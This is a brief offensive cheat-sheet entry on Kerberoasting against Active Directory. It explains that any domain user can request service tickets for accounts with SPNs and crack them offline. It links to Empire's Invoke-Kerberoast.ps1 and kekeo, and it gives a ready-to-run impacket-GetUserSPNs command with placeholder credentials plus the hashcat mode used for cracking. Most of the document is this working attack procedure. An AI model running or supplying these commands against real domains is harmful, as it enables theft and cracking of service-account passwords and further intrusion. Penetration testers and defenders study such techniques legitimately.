# kerberoasting

All domain users can request a copy of all service accounts along with their password hashes. This allows user to
request service ticket (ST) for any service w/ registered SPN (service princical name) then use the ST to crack service
password.

* [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1)
* [kekeo](https://github.com/gentilkiwi/kekeo)

## Usage

### impacket

```bash
impacket-GetUserSPNs DOMAIN.com/USER:'PASS' -dc-ip DC_IP -request
# hashcat -m 13100
```
